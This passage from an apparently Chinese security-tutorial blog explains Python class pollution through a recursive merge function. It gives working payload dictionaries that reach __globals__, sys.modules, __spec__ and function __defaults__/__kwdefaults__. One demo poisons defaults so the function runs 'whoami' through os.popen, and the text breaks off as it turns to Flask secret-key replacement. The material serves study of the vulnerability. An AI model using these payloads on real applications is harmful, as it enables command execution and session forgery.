class="hljs-built_in">print</span>(math.__loader__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>SourceFileLoader</strong></p><ul><li>用于加载来自文件系统的模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> test<br><span class="hljs-built_in">print</span>(test.__loader__)<br>&lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x0000018931CD6E70</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>ExtensionFileLoader</strong></p><ul><li>用于加载拓展模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy<br><span class="hljs-built_in">print</span>(numpy.__loader__)<br>&lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001C8DC2710D0</span>&gt;<br></code></pre></td></tr></table></figure><p>只要是<code>BuiltinImporter</code>的加载器都行，所以这里还有**_<em>spec</em>_**也能用</p><p><code>__spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311173156762.png" alt="image-20250311173156762"></p><p>看个<code>demo</code></p><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    secret=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><code>demo.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">import</span> test<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;importlib&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;__loader__&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                                    <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                                        <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                                            <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>                                        &#125;<br>                                    &#125;<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br><br></code></pre></td></tr></table></figure><p>然后<code>__spec__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> test<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;math&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;__spec__&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                                    <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                                            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>                                        &#125;<br>                                    &#125;<br>                                &#125;,<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br><br></code></pre></td></tr></table></figure><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><p><code>__defaults__</code>是一个<strong>元组</strong>，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在<code>__defaults__</code><strong>元组</strong>中。我们可以通过这个属性来污染参数默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,y=<span class="hljs-number">2</span>,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment"># (2,3)</span><br></code></pre></td></tr></table></figure><p>这是一个函数，有三个参数，其中一个必填参数(<code>x</code>)，还有两个是可选参数(<code>y</code>，<code>z</code>)，再多看看，把<code>__default__</code>看懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_b</span>(<span class="hljs-params">var_1, var_2</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(func_b.__defaults__)<br><span class="hljs-comment"># None</span><br></code></pre></td></tr></table></figure><p>那么再来看个特殊的</p><blockquote><ol><li><p><code>/</code> 之前的参数</p><p>：</p><ul><li>这些参数是 <strong>位置参数</strong>（positional-only parameters）。</li><li>它们只能通过位置传递，不能通过关键字传递。</li></ul></li><li><p><code>/</code> 和 <code>*</code> 之间的参数</p><p>：</p><ul><li>这些参数既可以是 <strong>位置参数</strong>，也可以是 <strong>关键字参数</strong>。</li><li>它们可以通过位置或关键字传递。</li></ul></li><li><p><code>*</code> 之后的参数</p><p>：</p><ul><li>这些参数是 <strong>关键字参数</strong>（keyword-only parameters）。</li><li>它们只能通过关键字传递，不能通过位置传递。</li><li>有默认值但是不计入<code>__defualts__</code></li></ul></li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br>a(x=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># TypeError: a() got some positional-only arguments passed as keyword arguments: &#x27;x&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br>a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>)<br><span class="hljs-comment"># TypeError: a() takes from 1 to 2 positional arguments but 3 were given</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-built_in">print</span>(x,y,z)<br>    <span class="hljs-keyword">pass</span><br><br>a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,z=<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(a.__defaults__)<br></code></pre></td></tr></table></figure><p>欧克懂了之后来污染吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>(<span class="hljs-params">x,name=<span class="hljs-string">&quot;baozongwi&quot;</span>,age=<span class="hljs-string">&quot;99&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> name != <span class="hljs-string">&quot;12SqweR&quot;</span>:<br>        <span class="hljs-built_in">print</span>(x)<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">if</span> age != <span class="hljs-string">&quot;99&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(x).read())<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v,dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k]=v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst,k,v)<br>a=A()<br>b=demo<br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span>:<br>                    (<span class="hljs-string">&quot;12SqweR&quot;</span>,<span class="hljs-string">&quot;100&quot;</span>)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(b.__defaults__)<br>merge(payload,a)<br><span class="hljs-built_in">print</span>(b.__defaults__)<br>c=demo(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>这个<code>__defaults__</code>的写法一定要对，是元组，不然就失败，当然如果是<code>True</code>或者<code>False</code>的话，就可以直接写</p><p>查看一些污染类文章发现用<code>sys</code>一样可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,y=<span class="hljs-string">&quot;123456&quot;</span>,z=<span class="hljs-string">&quot;test&quot;</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>a = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;__main__&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;__defaults__&quot;</span>: (<span class="hljs-string">&quot;hacker&quot;</span>, <span class="hljs-string">&quot;hacker&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(test.__defaults__)<br><br>merge(payload, a)<br><span class="hljs-built_in">print</span>(test.__defaults__)<br><br></code></pre></td></tr></table></figure><p>除了<code>__defaults__</code>还有<code>__kwdefaults__</code>，大差不差，只不过这个是字典，cancan</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_b</span>(<span class="hljs-params">var_1, /, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_c</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, *, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_d</span>(<span class="hljs-params">var_1, /, var_2 =<span class="hljs-number">2</span>, *, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(func_a.__kwdefaults__)<br><span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(func_b.__kwdefaults__)<br><span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(func_c.__kwdefaults__)<br><span class="hljs-comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span><br><span class="hljs-built_in">print</span>(func_d.__kwdefaults__)<br><span class="hljs-comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span><br></code></pre></td></tr></table></figure><p>发现只有关键字参数的默认值才会返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,*,y=<span class="hljs-string">&quot;123456&quot;</span>,z=<span class="hljs-string">&quot;test&quot;</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>a = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;y&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span>,<br>                    <span class="hljs-string">&quot;z&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(test.__kwdefaults__)<br>merge(payload, a)<br><span class="hljs-built_in">print</span>(test.__kwdefaults__)<br><br></code></pre></td></tr></table></figure><h3 id="flask特定属性污染"><a href="#flask特定属性污染" class="headerlink" title="flask特定属性污染"></a>flask特定属性污染</h3><p>需要了解一些框架的底层，</p><h4 id="密钥替换"><a href="#密钥替换" class="headerlink" title="密钥替换"></a>密钥替换</h4><p>这里直接贴代码吧，可以造成任意session伪造甚至改变pin码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge 